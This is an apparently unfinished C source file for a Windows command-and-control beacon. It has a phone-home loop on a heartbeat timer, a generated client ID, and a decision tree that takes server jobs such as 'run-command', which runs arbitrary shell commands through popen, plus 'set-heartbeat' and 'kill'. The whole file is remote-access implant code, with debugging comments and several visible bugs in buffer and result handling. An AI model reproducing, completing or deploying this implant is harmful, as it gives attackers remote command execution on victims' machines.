/* !! Continue this on the windows-dev machine */
#include <stdio.h>
#include <stdlib.h>

//linux
//#include <sys/socket.h>
//#include <arpa/inet.h>

//windows
#include <winsock2.h>
#include <ws2tcpip.h> 

#include <unistd.h>
#include <string.h>
#include <time.h>

//declaring functions
char* run_command(char* command);
int send_message(int sock, char *response);
char * phone_home();
char * client_id_generate();
char * decision_tree(SOCKET sock, WSADATA wsa);
size_t decode_utf8(const char* utf8_str, char* decoded_str);

//converstion functions (lifesavers btw)
int char_to_int(char * input_str);

//structs for the win... makes life easy :)
struct connection {
    int first_connection;
    char * client_id;
    int heartbeat;
    int port;
    char * address;
};

struct connection server_connection;

typedef struct {
    char * job;
    char * command;
} job;
//job current_job = {"name","command"};
//have to initialize down here so the compiler knows what 'job' is
job string_splitter(char * string_to_split);

int main() {
    char * ph_value;

    //int first_connection = 0;
    server_connection.client_id = client_id_generate();
    server_connection.heartbeat = 15;
    server_connection.port = 100;
    server_connection.address = "127.0.0.1";
    //client id

    //char * client_id = client_id_generate();

    while ( 1 == 1) {
        // phoning home
        printf("\nPhoning home\n");

        //receiveing commands from server & doing jobs
        
        ph_value = phone_home(server_connection.client_id);

        //int first_connection = 1;

        //printf("ph_value = %s", ph_value);

        // if server says wait, return continue & wait for X time
        if ( strcmp(ph_value, "continue" ) == 0 ) {
            printf("SLEEPING IN MAIN\n");
            sleep(server_connection.heartbeat);
            //for some reason it sleeps first, then prints?
        }

        // catchall for if nothing matches, it assumes this is an error & exits
        // Err statemnts/more specifics come from return functions in phone_home
        else {
            printf("ERR: %s\n", ph_value);
            return -1;
        }
        
    }
    
    return 1;

}

#pragma comment(lib, "ws2_32.lib") // Link with ws2_32.lib

char* phone_home(char* client_id) {
    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serv_addr;
    char* hello = "Hello from client";

    //char buffer[1024] = {0};
    //int result = WSAStartup(MAKEWORD(2, 2), &wsa);


    printf("Process ID: %d\n", GetCurrentProcessId());

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("WSAStartup failed. Error Code : %d", WSAGetLastError());
        return "continue";
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Socket creation error : %d", WSAGetLastError());
        WSACleanup();
        return "continue";
    }

    // Set server address and port
    memset(&serv_addr, '0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(server_connection.port);
    serv_addr.sin_addr.s_addr = inet_addr(server_connection.address);

    
    // Convert IPv4 and IPv6 addresses from text to binary form
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) != 0) {
        printf("Connection error\n");
        closesocket(sock);
        WSACleanup();
        return "continue";
    }

    /*
    // Heartbeat: on failed connection, 'wait' for X time & try to reconnect again. 
    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
        printf("Connection error : %d", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return "continue";
    }*/

    else {
        printf("Running decision tree.\n");
        decision_tree(sock, wsa);
    }
    
    
    // if connect does not error out/not connect, run decision_tree, otherwise wait (return continue)

}

/* !! The buffer is not getting passed properly, not 100% sure why, but it is filling the memory space with randomc haracters
and that's why they are random as FUCK
*/


/* Del up to here for windows, then copy paste over*/

//need to get proper variables passed here, atm the loop workds, but this is not set up yet
char * decision_tree(SOCKET sock, WSADATA wsa) {
    int result = WSAStartup(MAKEWORD(2, 2), &wsa);
    char buffer[1024] = {0};

    //printf("server first connection: %i\n", server_connection.first_connection);

    //sending client_id
    send_message(sock, server_connection.client_id);
    printf("waiting on server response=======\n");

    printf("Sock Value: %i\n", sock);

    result = recv(sock, buffer, sizeof(buffer), 0);
    printf("Response current Buffer: %s\n", buffer);

    if (result == -1 ) {
        perror("WSA result Error");
        //return -1;
    }

    /* turning buffer into newbuffer (aka a char array)*/
    int len = strlen(buffer); // get the length of the string
    char* new_buffer = malloc(len + 1); // allocate memory for new buffer that can hold null character
    strcpy(new_buffer, buffer); // copy original string to new buffer
    new_buffer[len] = '\0';

    //DEBUG: new_buffer doesn't equal anything
    printf("new_buffer = %s\n", new_buffer);

    if ( strcmp(new_buffer, "") ==0 ) {
        new_buffer = "NoBuffer\\|/FromServer";
        printf("Buffer not received from server!! \nFail Buffer is: %s\n", new_buffer);
    }
    
    job return_job = string_splitter(new_buffer);

    printf("\n%s, %s\n", return_job.job, return_job.command);

    //printf("%s\n", new_buffer);

    
    ///// Decision tree

    if ( strcmp(return_job.job, "run-command" ) == 0 ) {
        printf("Run command Function \n");
        //creating space on the heap for the results
        char * command_results = malloc(1024);

        //copying results to said memory location
        strcpy(command_results, run_command(return_job.command));

        //printing results
        printf("%s\n", command_results);

        //freeing memory
        free(command_results);
        return "continue";

    }

    else if ( strcmp(return_job.job, "wait" )==0) {
        printf("Received wait...");
        return "continue";
    }

    else if ( strcmp(return_job.job, "set-heartbeat" )==0) {
        // command in this case is the time to set the heartbeat for

        //easy way to put char * to str
        //int new_heartbeat = atoi(return_job.command);

        int new_heartbeat;
        //safer way
        new_heartbeat = char_to_int(return_job.command);
        server_connection.heartbeat = new_heartbeat;

        printf("%i\n", new_heartbeat);
        printf("%i\n", server_connection.heartbeat);
        return "continue";
    }

    else if ( strcmp(return_job.job, "kill" )==0) {
        exit(0);
    }

    else {
        printf("DEBUG: WAITING AS NO COMMANDS WERE RECIEVED\n");
        //close(sock);
        return "continue";
    }


    // closing sock 
    //close(sock);

    //cleanup
    //free(return_job.job);
    //free(return_job.command);
    //free(new_buffer);


    return "continue";
}


//this takes the socket file, and the response to send back to the server. 
int send_message(int sock, char *response) {
    printf("Sending '%s'\n", response);
    //char * cat_response = "test\\|/test";

    //creating space in memory, as char * cat_response is an uninitizalized pointer.
    //basically, it needs a spot to store its output
    char * cat_response = malloc(strlen(server_connection.client_id) + strlen(response) + 3);

    // this is hanging due to no timeout I think. No idea why the program is ending though
    //wiat... why is it trying to send a message if its not connected??
    /*
    if (send(sock, response, strlen(response),0 ) < 0) {
        perror("sending error");
        return -1;
    }
    
    else {
        //send(sock, response, strlen(response),0);
        printf("DEBUG: Message sent successfully==========\n\n");
        //return 0;
    }*/

    //combining the clinet ID, and the message to send back

    sprintf(cat_response, "%s\\|/%s", server_connection.client_id, response);

    printf("cat_response = %s", cat_response);

    send(sock, cat_response, strlen(cat_response),0);
    free(cat_response);
    //send(sock, "ID\\|/response", strlen("ID\\|/response"),0);
    printf("DEBUG: Message sent successfully==========\n\n");
    return 0;

}

//This is pretty sweet, integrating a struct & the function

// basically creating our own data type, in this case the 'job' data type
//makes it easier to do returns and such as well (see job string_splitter)


// seems to be nothing going into string_to_split... may be the casue of the random characters
job string_splitter(char * string_to_split) {
    //printf("string to split: %s", string_to_split);
    job new_job;
    new_job.job = malloc(100); // allocate memory for job field
    new_job.command = malloc(1000); // allocate memory for command field
    char * pch;
    pch = strtok (string_to_split,"\\|/");
    int i = 0;
    while (pch != NULL)
    {
        if (i == 0) {
            new_job.job = pch;
        }
        if (i == 1) {
            new_job.command = pch;
        }
        pch = strtok (NULL, "\\|/");
        //adding one to the count
        i++;
    }
    
    printf("new job %s \n:", new_job.job);
    printf("new_job command %s\n :", new_job.command);
    return new_job;
}


char* run_command(char* raw_command) {
    printf("(standin) Runnning command %s\n",raw_command);
    //return "something";

    FILE *fp;
    char path[1035];

    //memory for results_return
    char * results_return = malloc(1024);

    /* Open the command for reading. */
    fp = popen(raw_command, "r");
    if (fp == NULL) {
        printf("Failed to run command\n" );
        exit(1);
    }

    /* Read the output a line at a time - output it. */
    while (fgets(path, sizeof(path), fp) != NULL) {
        printf("%s", path);
    }

    /* close */
    pclose(fp);

    strcpy(results_return, path);
    return results_return;

}

char * client_id_generate() {
    // seed the random number generator with the current time
    srand(time(NULL));

    // adding a spot in memory for this variable, as it will vanish otherwise (on return) if not allocated
    //mutliplying by 7 as a char is one byte
    char* random_string = malloc(sizeof(char) * 7);

    //looping 5 times, and associating a number with a letter
    for (int i = 0; i < 6; i++) {
        /*% is moduluo, it decided the number based on the remainder of rand/26, 
        which is never higher than the number that is dividing (26)*/
        int random_number = rand() % 26;
        random_string[i] = 'A' + random_number;
    }
    random_string[6] = '\0';
    
    // print the random string
    printf("RandoString\n");
    printf("Random string: %s", random_string);

    return random_string;

}

int char_to_int(char * input_str) {
    //char* str = "12345";
    char* endptr;
    // strtol(ChartoConveer, check for \0 else error, and base 10)
    int num = strtol(input_str, &endptr, 10);
    if (*endptr != '\0') {
    // error, input string is not a valid integer
        printf("ERR Invalid Input string");
    }
    //might need to allocate some mem for this
    return num;
}